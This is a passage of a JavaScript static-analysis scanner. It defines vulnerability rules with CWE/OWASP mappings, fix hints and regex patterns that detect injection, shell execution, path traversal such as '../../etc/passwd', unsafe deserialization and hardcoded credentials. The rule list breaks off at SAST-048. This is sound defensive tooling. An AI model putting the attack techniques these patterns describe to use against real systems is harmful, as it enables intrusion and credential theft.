'use strict';

// ─── File type filtering ──────────────────────────────────────────────────────
const SCANNABLE_EXTS = [
  '.js','.ts','.jsx','.tsx','.mjs','.cjs',
  '.py','.rb','.php','.java','.go','.cs',
  '.cpp','.c','.swift','.kt','.rs',
  '.html','.ejs','.hbs','.pug',
  '.sh','.bash',
];
const SKIP_EXTS = [
  '.min.js','.min.css','.map','.lock',
  '.png','.jpg','.gif','.pdf','.zip',
  '.exe','.bin','.ttf','.woff','.woff2',
];
function isScannableFile(fp) {
  const l = fp.toLowerCase();
  if (SKIP_EXTS.some(e => l.endsWith(e))) return false;
  if (/node_modules|vendor\/|dist\/|build\/|\.min\./.test(fp)) return false;
  return SCANNABLE_EXTS.some(e => l.endsWith(e));
}

// ─── Comment line check ───────────────────────────────────────────────────────
function isComment(line) {
  const t = line.trim();
  return t.startsWith('//') || t.startsWith('#') || t.startsWith('*') ||
         t.startsWith('/*') || t.startsWith('<!--') || t.startsWith('--');
}

// ─── Unique ID ────────────────────────────────────────────────────────────────
function uid(id) {
  return id + '-' + Date.now() + '-' + Math.random().toString(36).substr(2,5);
}

// ─── 55 RULES ─────────────────────────────────────────────────────────────────
const RULES = [

  // ── INJECTION ──────────────────────────────────────────────────────────────
  {
    id:'SAST-001', name:'SQL Injection', cwe:'CWE-89', sev:'CRITICAL',
    owasp:'A03:2021', mitre:'T1190', confidence:'HIGH',
    desc:'User input concatenated into SQL query. Full database compromise possible.',
    fix:'Use parameterized queries: db.query("SELECT * FROM users WHERE id=?",[id])',
    patterns:[
      /["'`][^"'`]*(SELECT|INSERT|UPDATE|DELETE|DROP|UNION)[^"'`]*["'`]\s*\+/gi,
      /`[^`]*(SELECT|INSERT|UPDATE|DELETE|DROP|UNION)[^`]*\$\{[^}]*(?:req\.|params\.|query\.|body\.)[^}]*\}`/gi,
      /(?:\.query|\.execute)\s*\(\s*["'`][^"'`]*(SELECT|INSERT|UPDATE|DELETE)/gi,
      /"SELECT.*"\s*\+\s*(?:req\.|params\.|query\.|body\.)/gi,
      /cursor\.execute\s*\(\s*f?["'][^"']*%[sd]/gi,
      /\$(?:_GET|_POST|_REQUEST)\[[^\]]*\].*(?:SELECT|INSERT|UPDATE|DELETE)/gi,
      /Statement.*executeQuery\s*\([^)]*\+/gi,
      /prepareStatement\s*\([^)]*\+[^)]*(?:req\.|request\.|param)/gi,
    ]
  },
  {
    id:'SAST-002', name:'Command Injection', cwe:'CWE-78', sev:'CRITICAL',
    owasp:'A03:2021', mitre:'T1059', confidence:'HIGH',
    desc:'User-controlled input passed to OS shell. Remote code execution possible.',
    fix:'Use execFile(cmd,[args],{shell:false}). Never pass user input to exec().',
    patterns:[
      /exec\s*\(\s*["'`][^"'`]*["'`]\s*\+/gi,
      /exec\s*\(`[^`]*\$\{/gi,
      /execSync\s*\(`[^`]*\$\{/gi,
      /spawnSync\s*\(\s*["'`][^"'`]*["'`]\s*\+/gi,
      /subprocess\.(call|run|Popen)\s*\([^)]*shell\s*=\s*True/gi,
      /os\.system\s*\([^)]*(?:req\.|request\.|input\()/gi,
      /Runtime\.getRuntime\(\)\.exec\s*\([^)]*\+/gi,
      /ProcessBuilder\s*\([^)]*\+[^)]*(?:req\.|input)/gi,
    ]
  },
  {
    id:'SAST-003', name:'NoSQL Injection', cwe:'CWE-943', sev:'CRITICAL',
    owasp:'A03:2021', mitre:'T1190', confidence:'MEDIUM',
    desc:'Unsanitized input in MongoDB query. Operator injection ($gt,$where) possible.',
    fix:'Use mongo-sanitize. Never pass req.body directly to find() or findOne().',
    patterns:[
      /\.find\s*\(\s*(?:req\.body|req\.query|req\.params)\s*\)/gi,
      /\.findOne\s*\(\s*(?:req\.body|req\.query)\s*\)/gi,
      /\.findById\s*\(\s*(?:req\.body|req\.query|req\.params)/gi,
      /\.update(?:One|Many)?\s*\(\s*(?:req\.body|req\.query)/gi,
      /\$where\s*:\s*["'`][^"'`]*["'`]/gi,
    ]
  },
  {
    id:'SAST-004', name:'Template Injection (SSTI)', cwe:'CWE-94', sev:'CRITICAL',
    owasp:'A03:2021', mitre:'T1059', confidence:'HIGH',
    desc:'User input inside template engine. Remote code execution via template syntax.',
    fix:'Never render user input as a template. Use variables inside templates.',
    patterns:[
      /render_template_string\s*\([^)]*(?:request\.|input)/gi,
      /Environment\(\)\.from_string\s*\([^)]*(?:request\.|input)/gi,
      /ejs\.render\s*\([^)]*(?:req\.|input)/gi,
      /pug\.render\s*\([^)]*(?:req\.|input)/gi,
      /Handlebars\.compile\s*\([^)]*(?:req\.|input)/gi,
    ]
  },
  {
    id:'SAST-005', name:'LDAP Injection', cwe:'CWE-90', sev:'HIGH',
    owasp:'A03:2021', mitre:'T1190', confidence:'MEDIUM',
    desc:'User input in LDAP filter. Authentication bypass possible.',
    fix:'Escape LDAP special chars: & | ! = < > ~ * ( ) \\ NUL',
    patterns:[
      /ldap.*search.*\+.*(?:req\.|request\.|input)/gi,
      /ldap\.search\s*\([^)]*\+/gi,
      /cn=.*\+.*(?:req\.|username|input)/gi,
    ]
  },

  // ── XSS ────────────────────────────────────────────────────────────────────
  {
    id:'SAST-006', name:'Cross-Site Scripting (XSS)', cwe:'CWE-79', sev:'HIGH',
    owasp:'A03:2021', mitre:'T1185', confidence:'HIGH',
    desc:'Unescaped user input rendered as HTML. Session hijacking possible.',
    fix:'Use textContent not innerHTML. Sanitize with DOMPurify.sanitize().',
    patterns:[
      /innerHTML\s*=\s*(?!["'`])[^;]*(?:req\.|request\.|params\.|query\.|body\.)/gi,
      /innerHTML\s*\+=\s*/gi,
      /document\.write\s*\([^)]*(?:\+|\$\{)/gi,
      /dangerouslySetInnerHTML\s*=\s*\{\s*\{\s*__html/gi,
      /res\.send\s*\([^)]*(?:req\.query|req\.params|req\.body)[^)]*\)/gi,
      /outerHTML\s*=\s*[^"'`]/gi,
      /insertAdjacentHTML\s*\([^)]*(?:req\.|input|user)/gi,
      /v-html\s*=\s*["'][^"']*(?:user|input|req)/gi,
    ]
  },
  {
    id:'SAST-007', name:'Reflected XSS in Response', cwe:'CWE-79', sev:'HIGH',
    owasp:'A03:2021', mitre:'T1185', confidence:'HIGH',
    desc:'User-supplied value echoed directly in HTTP response without escaping.',
    fix:'HTML-encode output: use he.encode(str) or sanitize before sending.',
    patterns:[
      /res\.(?:send|write|end)\s*\([^)]*(?:req\.query\.|req\.params\.|req\.body\.)[^)]*\)/gi,
      /response\.write\s*\([^)]*(?:request\.|req\.)/gi,
      /echo\s+\$(?:_GET|_POST|_REQUEST)\[/gi,
      /print\s*\([^)]*request\.(?:GET|POST|args)/gi,
    ]
  },

  // ── PATH / FILE ─────────────────────────────────────────────────────────────
  {
    id:'SAST-008', name:'Path Traversal', cwe:'CWE-22', sev:'HIGH',
    owasp:'A01:2021', mitre:'T1083', confidence:'HIGH',
    desc:'Unvalidated file path allows access outside intended directory (../../etc/passwd).',
    fix:'Resolve and validate: const s=path.resolve(BASE,input); assert(s.startsWith(BASE))',
    patterns:[
      /(?:readFile|readFileSync|createReadStream)\s*\([^)]*(?:req\.|params\.|query\.)/gi,
      /res\.sendFile\s*\([^)]*(?:req\.|params\.|query\.)/gi,
      /fs\.\w+\s*\([^)]*(?:\+|`)[^)]*(?:req\.|params\.|query\.)/gi,
      /open\s*\([^)]*(?:request\.|input\()/gi,
      /File\s*\(\s*[^)]*\+[^)]*(?:req\.|request\.|param)/gi,
      /include\s*\(\s*\$(?:_GET|_POST)\[/gi,
      /require_once\s*\(\s*\$(?:_GET|_POST)\[/gi,
    ]
  },
  {
    id:'SAST-009', name:'Arbitrary File Upload', cwe:'CWE-434', sev:'HIGH',
    owasp:'A04:2021', mitre:'T1105', confidence:'MEDIUM',
    desc:'File upload without type validation. Attacker can upload PHP/JS webshell.',
    fix:'Validate MIME type server-side. Restrict extensions. Store outside webroot.',
    patterns:[
      /multer\s*\(\s*\{[^}]*\}\s*\)(?![\s\S]{0,200}fileFilter)/gi,
      /move_uploaded_file\s*\([^)]*\$(?:_FILES)/gi,
      /\.mimetype\b(?![\s\S]{0,100}(?:allow|valid|check|filter))/gi,
    ]
  },

  // ── CRYPTOGRAPHY ───────────────────────────────────────────────────────────
  {
    id:'SAST-010', name:'Weak Cryptography (MD5/SHA1)', cwe:'CWE-327', sev:'MEDIUM',
    owasp:'A02:2021', mitre:'T1552', confidence:'HIGH',
    desc:'MD5 and SHA-1 are cryptographically broken. Not safe for passwords or signatures.',
    fix:'Use SHA-256 for integrity. Use bcrypt/argon2 for passwords.',
    patterns:[
      /createHash\s*\(\s*["']md5["']/gi,
      /createHash\s*\(\s*["']sha1["']/gi,
      /hashlib\.md5\s*\(/gi,
      /hashlib\.sha1\s*\(/gi,
      /MessageDigest\.getInstance\s*\(\s*["']MD5["']/gi,
      /MessageDigest\.getInstance\s*\(\s*["']SHA-1["']/gi,
      /md5\s*\(\s*\$(?:_GET|_POST|password)/gi,
    ]
  },
  {
    id:'SAST-011', name:'Weak Cipher (DES/RC4)', cwe:'CWE-327', sev:'HIGH',
    owasp:'A02:2021', mitre:'T1552', confidence:'HIGH',
    desc:'DES and RC4 are broken ciphers. Data encrypted with these can be decrypted.',
    fix:'Use AES-256-GCM for symmetric encryption.',
    patterns:[
      /createCipheriv\s*\(\s*["'](?:des|rc4|rc2|blowfish)/gi,
      /Cipher\.getInstance\s*\(\s*["']DES/gi,
      /Cipher\.getInstance\s*\(\s*["']RC4/gi,
      /DESKeySpec\s*\(/gi,
    ]
  },
  {
    id:'SAST-012', name:'Insecure Random', cwe:'CWE-338', sev:'MEDIUM',
    owasp:'A02:2021', mitre:'T1552', confidence:'HIGH',
    desc:'Math.random() is not cryptographically secure. Tokens can be predicted.',
    fix:'Use crypto.randomBytes(32).toString("hex") for tokens and session IDs.',
    patterns:[
      /Math\.random\s*\(\s*\)/gi,
      /random\.random\s*\(\s*\)/gi,
      /new\s+Random\s*\(\s*\)(?![\s\S]{0,50}SecureRandom)/gi,
    ]
  },
  {
    id:'SAST-013', name:'Hardcoded JWT Secret', cwe:'CWE-798', sev:'CRITICAL',
    owasp:'A02:2021', mitre:'T1552', confidence:'HIGH',
    desc:'JWT signed with hardcoded string. Token forgery and auth bypass possible.',
    fix:'Use process.env.JWT_SECRET. Generate: openssl rand -hex 64',
    patterns:[
      /jwt\.sign\s*\([^,]+,\s*["'][^"']{6,}["']/gi,
      /jwt\.verify\s*\([^,]+,\s*["'][^"']{6,}["']/gi,
      /secret\s*[:=]\s*["'][^"']{6,}["'].*jwt/gi,
    ]
  },
  {
    id:'SAST-014', name:'Insecure TLS Configuration', cwe:'CWE-295', sev:'HIGH',
    owasp:'A02:2021', mitre:'T1557', confidence:'HIGH',
    desc:'SSL/TLS certificate verification disabled. MITM attacks possible.',
    fix:'Never set rejectUnauthorized:false in production. Use valid certificates.',
    patterns:[
      /rejectUnauthorized\s*:\s*false/gi,
      /verify\s*=\s*False/gi,
      /ssl_verify\s*=\s*False/gi,
      /CURLOPT_SSL_VERIFYPEER.*false/gi,
      /checkServerIdentity\s*:\s*\(\s*\)\s*=>\s*(?:null|undefined|\{\s*\})/gi,
    ]
  },

  // ── AUTHENTICATION & SESSION ────────────────────────────────────────────────
  {
    id:'SAST-015', name:'Missing Authentication Check', cwe:'CWE-306', sev:'HIGH',
    owasp:'A07:2021', mitre:'T1190', confidence:'LOW',
    desc:'Admin/sensitive route with no visible authentication middleware.',
    fix:'Add auth middleware before sensitive routes: router.use(requireAuth)',
    patterns:[
      /router\.(get|post|put|delete|patch)\s*\(\s*["'][^"']*(?:admin|dashboard|manage|internal)[^"']*["']\s*,\s*(?:async\s*)?\([^)]*\)\s*=>/gi,
    ]
  },
  {
    id:'SAST-016', name:'Insecure Cookie', cwe:'CWE-614', sev:'MEDIUM',
    owasp:'A05:2021', mitre:'T1185', confidence:'MEDIUM',
    desc:'Cookie without Secure/HttpOnly can be stolen via XSS or network sniffing.',
    fix:'Set: res.cookie("s",val,{httpOnly:true,secure:true,sameSite:"strict"})',
    patterns:[
      /res\.cookie\s*\([^)]+\)(?![\s\S]{0,100}httpOnly)/gi,
      /document\.cookie\s*=\s*(?!.*HttpOnly)/gi,
      /setcookie\s*\([^)]*\)(?![\s\S]{0,50}true.*true)/gi,
    ]
  },
  {
    id:'SAST-017', name:'Missing Rate Limiting', cwe:'CWE-799', sev:'MEDIUM',
    owasp:'A04:2021', mitre:'T1498', confidence:'LOW',
    desc:'Login/auth endpoint with no rate limiting. Brute-force attacks possible.',
    fix:'Use express-rate-limit: rateLimit({max:10,windowMs:15*60*1000})',
    patterns:[
      /router\.post\s*\(\s*["'][^"']*(?:login|signin|auth|token)[^"']*["']/gi,
    ]
  },
  {
    id:'SAST-018', name:'Weak Session Configuration', cwe:'CWE-330', sev:'MEDIUM',
    owasp:'A07:2021', mitre:'T1185', confidence:'MEDIUM',
    desc:'Session secret hardcoded or too weak. Session hijacking possible.',
    fix:'Use strong random secret: crypto.randomBytes(64).toString("hex")',
    patterns:[
      /session\s*\(\s*\{[^}]*secret\s*:\s*["'][^"']{1,20}["']/gi,
      /express-session.*secret.*["'][^"']{1,15}["']/gi,
      /SECRET_KEY\s*=\s*["'][^"']{1,20}["']/gi,
    ]
  },
  {
    id:'SAST-019', name:'JWT Algorithm None Attack', cwe:'CWE-327', sev:'CRITICAL',
    owasp:'A02:2021', mitre:'T1552', confidence:'HIGH',
    desc:'JWT accepts "none" algorithm. Signature verification can be bypassed.',
    fix:'Explicitly specify algorithms: jwt.verify(token,secret,{algorithms:["HS256"]})',
    patterns:[
      /jwt\.verify\s*\([^)]*\)(?![\s\S]{0,50}algorithms)/gi,
      /algorithm.*none/gi,
      /{"alg"\s*:\s*"none"}/gi,
    ]
  },

  // ── SENSITIVE DATA ──────────────────────────────────────────────────────────
  {
    id:'SAST-020', name:'Sensitive Data in Logs', cwe:'CWE-532', sev:'MEDIUM',
    owasp:'A09:2021', mitre:'T1552', confidence:'MEDIUM',
    desc:'Passwords or tokens logged to console. Appears in log aggregation systems.',
    fix:'Never log passwords, tokens, or PII. Log only sanitized metadata.',
    patterns:[
      /console\.log\s*\([^)]*(?:password|passwd|token|secret|apiKey|api_key)/gi,
      /logger\.\w+\s*\([^)]*(?:password|passwd|token|secret)/gi,
      /print\s*\([^)]*(?:password|passwd|secret|token)/gi,
      /System\.out\.print(?:ln)?\s*\([^)]*(?:password|secret|token)/gi,
    ]
  },
  {
    id:'SAST-021', name:'PII Exposure in Response', cwe:'CWE-359', sev:'HIGH',
    owasp:'A02:2021', mitre:'T1552', confidence:'MEDIUM',
    desc:'Full user object returned in API response. Exposes PII and sensitive fields.',
    fix:'Return only required fields. Use projection: User.findOne({},{password:0})',
    patterns:[
      /res\.json\s*\(\s*(?:user|account|profile)\s*\)(?!\s*\/\/.*safe)/gi,
      /res\.send\s*\(\s*(?:user|account|userData)\s*\)/gi,
      /return\s+res\.json\s*\(\s*await\s+User\.find\s*\(\s*\)\s*\)/gi,
    ]
  },

  // ── DESERIALIZATION & EVAL ──────────────────────────────────────────────────
  {
    id:'SAST-022', name:'Insecure Deserialization', cwe:'CWE-502', sev:'CRITICAL',
    owasp:'A08:2021', mitre:'T1059', confidence:'HIGH',
    desc:'Deserializing untrusted data. Remote code execution possible.',
    fix:'Use JSON.parse() for data. Never pickle.loads() or unserialize() user input.',
    patterns:[
      /eval\s*\(\s*(?!["'`])[^)]*(?:req\.|body\.|params\.|query\.)/gi,
      /new\s+Function\s*\([^)]*(?:req\.|body\.)/gi,
      /unserialize\s*\(/gi,
      /pickle\.loads?\s*\([^)]*(?:request\.|input)/gi,
      /yaml\.load\s*\([^,)]+\)(?!\s*,\s*Loader)/gi,
      /ObjectInputStream\s*\(/gi,
      /readObject\s*\(\s*\)/gi,
    ]
  },
  {
    id:'SAST-023', name:'Unsafe Regex (ReDoS)', cwe:'CWE-1333', sev:'MEDIUM',
    owasp:'A04:2021', mitre:'T1499', confidence:'MEDIUM',
    desc:'Catastrophic backtracking regex. Denial of service via crafted input.',
    fix:'Avoid nested quantifiers like (a+)+. Use linear-time regex or timeout.',
    patterns:[
      /new RegExp\s*\([^)]*(?:req\.|input|user)/gi,
      /\(\[.*\]\+\)\+/g,
      /\(.*\+.*\)\*/g,
    ]
  },

  // ── SSRF ────────────────────────────────────────────────────────────────────
  {
    id:'SAST-024', name:'Server-Side Request Forgery (SSRF)', cwe:'CWE-918', sev:'HIGH',
    owasp:'A10:2021', mitre:'T1090', confidence:'MEDIUM',
    desc:'HTTP request to user-controlled URL. Internal services and metadata accessible.',
    fix:'Validate URL against allowlist. Block 127.x, 10.x, 192.168.x, 169.254.x.',
    patterns:[
      /(?:axios\.get|axios\.post|fetch|http\.get|https\.get|request\.get)\s*\(\s*(?:req\.|request\.)/gi,
      /(?:axios|fetch)\s*\(\s*(?:req\.query|req\.body|req\.params)/gi,
      /fetch\s*\(`[^`]*\$\{[^}]*req\./gi,
      /urllib\.request\.urlopen\s*\([^)]*(?:request\.|input)/gi,
      /requests\.get\s*\([^)]*(?:request\.|input)/gi,
    ]
  },

  // ── PROTOTYPE POLLUTION ─────────────────────────────────────────────────────
  {
    id:'SAST-025', name:'Prototype Pollution', cwe:'CWE-1321', sev:'HIGH',
    owasp:'A03:2021', mitre:'T1190', confidence:'MEDIUM',
    desc:'Attacker keys pollute Object.prototype. Affects all objects globally.',
    fix:'Reject __proto__, constructor, prototype keys. Use Object.create(null).',
    patterns:[
      /Object\.assign\s*\(\s*(?:this|prototype|__proto__|obj)/gi,
      /\[\s*["']__proto__["']\s*\]/gi,
      /\[\s*["']constructor["']\s*\]\s*\[\s*["']prototype["']\s*\]/gi,
      /(?:_|lodash)\.merge\s*\([^)]*(?:req\.|body\.)/gi,
      /\.merge\s*\(\s*\{\s*\}\s*,\s*(?:req\.|body\.)/gi,
    ]
  },

  // ── REDIRECTS ──────────────────────────────────────────────────────────────
  {
    id:'SAST-026', name:'Unvalidated Redirect', cwe:'CWE-601', sev:'MEDIUM',
    owasp:'A01:2021', mitre:'T1185', confidence:'HIGH',
    desc:'Redirect URL from user input. Phishing and open redirect possible.',
    fix:'Whitelist allowed destinations. Never redirect to req.query.url directly.',
    patterns:[
      /res\.redirect\s*\([^)]*(?:req\.query|req\.body|req\.params)/gi,
      /header\s*\(\s*["']Location:\s*["']\s*\.\s*(?:\$_GET|\$_POST)/gi,
      /response\.sendRedirect\s*\([^)]*(?:request\.|param)/gi,
    ]
  },

  // ── SECURITY MISCONFIG ──────────────────────────────────────────────────────
  {
    id:'SAST-027', name:'Debug Mode in Production', cwe:'CWE-215', sev:'MEDIUM',
    owasp:'A05:2021', mitre:'T1082', confidence:'MEDIUM',
    desc:'Debug mode exposes stack traces, source maps, and internal state.',
    fix:'Use: debug: process.env.NODE_ENV === "development"',
    patterns:[
      /debug\s*[:=]\s*true/gi,
      /app\.run\s*\([^)]*debug\s*=\s*True/g,
      /DEBUG\s*=\s*True/g,
      /app\.set\s*\(\s*["']env["']\s*,\s*["']development["']\s*\)/gi,
    ]
  },
  {
    id:'SAST-028', name:'CORS Wildcard Origin', cwe:'CWE-942', sev:'MEDIUM',
    owasp:'A05:2021', mitre:'T1185', confidence:'HIGH',
    desc:'CORS allows all origins (*). Cross-origin requests from any site possible.',
    fix:'Specify exact origins: cors({origin:"https://yourdomain.com"})',
    patterns:[
      /cors\s*\(\s*\{[^}]*origin\s*:\s*["']\*["']/gi,
      /Access-Control-Allow-Origin.*\*/gi,
      /res\.header\s*\([^)]*Access-Control-Allow-Origin[^)]*\*\s*['"]/gi,
    ]
  },
  {
    id:'SAST-029', name:'Missing Security Headers', cwe:'CWE-693', sev:'MEDIUM',
    owasp:'A05:2021', mitre:'T1185', confidence:'LOW',
    desc:'No helmet/security headers. XSS, clickjacking, MIME sniffing attacks possible.',
    fix:'Use helmet middleware: app.use(require("helmet")())',
    patterns:[
      /const\s+app\s*=\s*express\s*\(\s*\)(?![\s\S]{0,300}helmet)/gi,
    ]
  },
  {
    id:'SAST-030', name:'XXE Injection', cwe:'CWE-611', sev:'HIGH',
    owasp:'A05:2021', mitre:'T1190', confidence:'MEDIUM',
    desc:'XML parser with external entities. Server file disclosure or SSRF possible.',
    fix:'Disable external entities: parser.setFeature("external-general-entities",false)',
    patterns:[
      /LIBXML_NOENT/gi,
      /loadXML\s*\(/gi,
      /DocumentBuilder(?![\s\S]{0,100}setFeature)/gi,
      /XMLReader(?![\s\S]{0,100}FEATURE_SECURE_PROCESSING)/gi,
    ]
  },

  // ── PYTHON-SPECIFIC ─────────────────────────────────────────────────────────
  {
    id:'SAST-031', name:'Python SQL Injection', cwe:'CWE-89', sev:'CRITICAL',
    owasp:'A03:2021', mitre:'T1190', confidence:'HIGH',
    desc:'Python DB query using string formatting. Full database compromise possible.',
    fix:'Use parameterized queries: cursor.execute("SELECT * FROM t WHERE id=%s",(id,))',
    patterns:[
      /cursor\.execute\s*\(\s*["'f][^)]*%(?:s|d|f)/gi,
      /cursor\.execute\s*\(\s*f["'][^"']*\{/gi,
      /cursor\.execute\s*\(\s*["'][^"']*"\s*\+/gi,
      /\.raw\s*\([^)]*%\s*(?:request\.|input)/gi,
    ]
  },
  {
    id:'SAST-032', name:'Python Shell Injection', cwe:'CWE-78', sev:'CRITICAL',
    owasp:'A03:2021', mitre:'T1059', confidence:'HIGH',
    desc:'Python os.system or subprocess with shell=True and user input.',
    fix:'Use subprocess.run([cmd, arg], shell=False, check=True)',
    patterns:[
      /os\.system\s*\([^)]*(?:request\.|input\(|f["'])/gi,
      /subprocess\.(call|run|Popen)\s*\([^)]*shell\s*=\s*True/gi,
      /commands\.getoutput\s*\(/gi,
      /os\.popen\s*\([^)]*(?:request\.|input)/gi,
    ]
  },
  {
    id:'SAST-033', name:'Python Pickle Deserialization', cwe:'CWE-502', sev:'CRITICAL',
    owasp:'A08:2021', mitre:'T1059', confidence:'HIGH',
    desc:'pickle.loads() on untrusted data. Arbitrary code execution possible.',
    fix:'Use json.loads() instead. Never unpickle data from untrusted sources.',
    patterns:[
      /pickle\.loads?\s*\(/gi,
      /cPickle\.loads?\s*\(/gi,
      /marshal\.loads?\s*\(/gi,
    ]
  },
  {
    id:'SAST-034', name:'Python Unsafe YAML', cwe:'CWE-502', sev:'HIGH',
    owasp:'A08:2021', mitre:'T1059', confidence:'HIGH',
    desc:'yaml.load() without Loader executes arbitrary Python objects.',
    fix:'Use yaml.safe_load() or yaml.load(data,Loader=yaml.SafeLoader)',
    patterns:[
      /yaml\.load\s*\([^,)]+\)(?!\s*,\s*Loader)/gi,
      /yaml\.load\s*\([^)]*\)(?![\s\S]{0,20}SafeLoader)/gi,
    ]
  },
  {
    id:'SAST-035', name:'Python eval() Injection', cwe:'CWE-95', sev:'CRITICAL',
    owasp:'A03:2021', mitre:'T1059', confidence:'HIGH',
    desc:'eval() on user-controlled input. Remote code execution possible.',
    fix:'Use ast.literal_eval() for safe Python literal evaluation.',
    patterns:[
      /eval\s*\([^)]*(?:request\.|input\(|sys\.argv)/gi,
      /exec\s*\([^)]*(?:request\.|input\()/gi,
      /compile\s*\([^)]*(?:request\.|input)/gi,
    ]
  },

  // ── PHP-SPECIFIC ─────────────────────────────────────────────────────────────
  {
    id:'SAST-036', name:'PHP SQL Injection', cwe:'CWE-89', sev:'CRITICAL',
    owasp:'A03:2021', mitre:'T1190', confidence:'HIGH',
    desc:'PHP query with $_GET/$_POST concatenated directly.',
    fix:'Use PDO prepared statements: $stmt=$pdo->prepare("SELECT * WHERE id=?");$stmt->execute([$id])',
    patterns:[
      /mysql_query\s*\([^)]*\$(?:_GET|_POST|_REQUEST)/gi,
      /mysqli_query\s*\([^)]*\$(?:_GET|_POST|_REQUEST)/gi,
      /\$(?:_GET|_POST|_REQUEST)\[[^\]]*\].*(?:SELECT|INSERT|UPDATE|DELETE)/gi,
      /"SELECT.*"\s*\.\s*\$(?:_GET|_POST)/gi,
    ]
  },
  {
    id:'SAST-037', name:'PHP Command Injection', cwe:'CWE-78', sev:'CRITICAL',
    owasp:'A03:2021', mitre:'T1059', confidence:'HIGH',
    desc:'PHP shell function with user input. Remote code execution possible.',
    fix:'Use escapeshellarg() or avoid shell functions entirely.',
    patterns:[
      /(?:system|exec|shell_exec|passthru|popen)\s*\([^)]*\$(?:_GET|_POST|_REQUEST)/gi,
      /`[^`]*\$(?:_GET|_POST|_REQUEST)[^`]*`/gi,
    ]
  },
  {
    id:'SAST-038', name:'PHP File Inclusion', cwe:'CWE-98', sev:'CRITICAL',
    owasp:'A03:2021', mitre:'T1190', confidence:'HIGH',
    desc:'PHP include/require with user-controlled path. LFI/RFI possible.',
    fix:'Whitelist allowed files. Never include paths from user input.',
    patterns:[
      /(?:include|require|include_once|require_once)\s*\(\s*\$(?:_GET|_POST|_REQUEST)/gi,
      /(?:include|require)\s+\$(?:_GET|_POST|_REQUEST)/gi,
    ]
  },
  {
    id:'SAST-039', name:'PHP XSS', cwe:'CWE-79', sev:'HIGH',
    owasp:'A03:2021', mitre:'T1185', confidence:'HIGH',
    desc:'PHP echoing user input without htmlspecialchars(). XSS possible.',
    fix:'Use htmlspecialchars($val, ENT_QUOTES, "UTF-8") before echoing.',
    patterns:[
      /echo\s+\$(?:_GET|_POST|_REQUEST)\[/gi,
      /print\s+\$(?:_GET|_POST|_REQUEST)\[/gi,
      /<\?=\s*\$(?:_GET|_POST|_REQUEST)/gi,
    ]
  },

  // ── JAVA-SPECIFIC ─────────────────────────────────────────────────────────
  {
    id:'SAST-040', name:'Java SQL Injection', cwe:'CWE-89', sev:'CRITICAL',
    owasp:'A03:2021', mitre:'T1190', confidence:'HIGH',
    desc:'Java statement built with string concat. Database compromise possible.',
    fix:'Use PreparedStatement: pstmt=con.prepareStatement("SELECT * WHERE id=?"); pstmt.setInt(1,id)',
    patterns:[
      /Statement.*executeQuery\s*\([^)]*\+/gi,
      /createStatement\s*\(\s*\).*execute.*\+/gi,
      /prepareStatement\s*\(\s*["'][^"']*"\s*\+/gi,
    ]
  },
  {
    id:'SAST-041', name:'Java XXE', cwe:'CWE-611', sev:'HIGH',
    owasp:'A05:2021', mitre:'T1190', confidence:'HIGH',
    desc:'Java XML parser with external entity expansion enabled.',
    fix:'Disable: factory.setFeature("http://xml.org/sax/features/external-general-entities",false)',
    patterns:[
      /DocumentBuilderFactory\.newInstance\s*\(\s*\)(?![\s\S]{0,300}setFeature)/gi,
      /SAXParserFactory\.newInstance\s*\(\s*\)(?![\s\S]{0,300}setFeature)/gi,
    ]
  },
  {
    id:'SAST-042', name:'Java Deserialization', cwe:'CWE-502', sev:'CRITICAL',
    owasp:'A08:2021', mitre:'T1059', confidence:'HIGH',
    desc:'Java ObjectInputStream deserialization of untrusted data. RCE possible.',
    fix:'Use SerialKiller or avoid Java serialization for untrusted data.',
    patterns:[
      /new\s+ObjectInputStream\s*\(/gi,
      /readObject\s*\(\s*\)/gi,
      /readUnshared\s*\(\s*\)/gi,
    ]
  },

  // ── INFRASTRUCTURE / CONFIG ─────────────────────────────────────────────────
  {
    id:'SAST-043', name:'Hardcoded Database Password', cwe:'CWE-259', sev:'CRITICAL',
    owasp:'A07:2021', mitre:'T1552', confidence:'HIGH',
    desc:'Database password hardcoded in source code. Credential theft possible.',
    fix:'Use environment variables: process.env.DB_PASSWORD',
    patterns:[
      /(?:password|passwd|pwd)\s*[:=]\s*["'][^"']{4,}["'](?!\s*(?:env|process|os\.))/gi,
      /(?:DB_PASS|DATABASE_PASSWORD|MYSQL_PASSWORD)\s*=\s*["'][^"']{4,}["']/gi,
      /(?:dataSource|connection).*password\s*=\s*["'][^"']{4,}["']/gi,
    ]
  },
  {
    id:'SAST-044', name:'AWS Credentials in Code', cwe:'CWE-798', sev:'CRITICAL',
    owasp:'A02:2021', mitre:'T1552', confidence:'HIGH',
    desc:'AWS credentials hardcoded. Cloud account compromise possible.',
    fix:'Use IAM roles or environment variables. Never hardcode AWS keys.',
    patterns:[
      /aws_access_key_id\s*=\s*["'][A-Z0-9]{20}["']/gi,
      /aws_secret_access_key\s*=\s*["'][A-Za-z0-9/+]{40}["']/gi,
      /AWS\.config\.update\s*\(\s*\{[^}]*accessKeyId\s*:\s*["'][^"']+["']/gi,
    ]
  },
  {
    id:'SAST-045', name:'Docker Root User', cwe:'CWE-250', sev:'MEDIUM',
    owasp:'A04:2021', mitre:'T1078', confidence:'HIGH',
    desc:'Dockerfile runs as root. Container breakout has full host access.',
    fix:'Add USER directive: USER node (after creating the user)',
    patterns:[
      /^FROM\s+\S+(?![\s\S]{0,500}^USER\s)/gm,
    ]
  },
  {
    id:'SAST-046', name:'Terraform Unrestricted Security Group', cwe:'CWE-732', sev:'HIGH',
    owasp:'A05:2021', mitre:'T1190', confidence:'HIGH',
    desc:'AWS security group allows all inbound traffic (0.0.0.0/0).',
    fix:'Restrict CIDR to known IPs. Never use 0.0.0.0/0 for sensitive ports.',
    patterns:[
      /cidr_blocks\s*=\s*\[\s*["']0\.0\.0\.0\/0["']\s*\]/gi,
      /ingress.*cidr_blocks.*0\.0\.0\.0\/0/gi,
    ]
  },

  // ── NODE.JS SPECIFIC ─────────────────────────────────────────────────────────
  {
    id:'SAST-047', name:'express-session Secret Weak', cwe:'CWE-330', sev:'MEDIUM',
    owasp:'A07:2021', mitre:'T1552', confidence:'HIGH',
    desc:'express-session with weak or hardcoded secret. Session forgery possible.',
    fix:'Generate strong secret: crypto.randomBytes(64).toString("hex")',
    patterns:[
      /session\s*\(\s*\{[^}]*secret\s*:\s*["'][^"']{1,20}["']/gi,
    ]
  },
  {
    id:'SAST-048', name:'Child Process with User Input', cwe:'CWE-78', sev:'CRITICAL',
    owasp:'A03:2021', mitre:'T1059', confidence:'HIGH',
    desc:'Node.js child_process receiving user input without shell:false.',
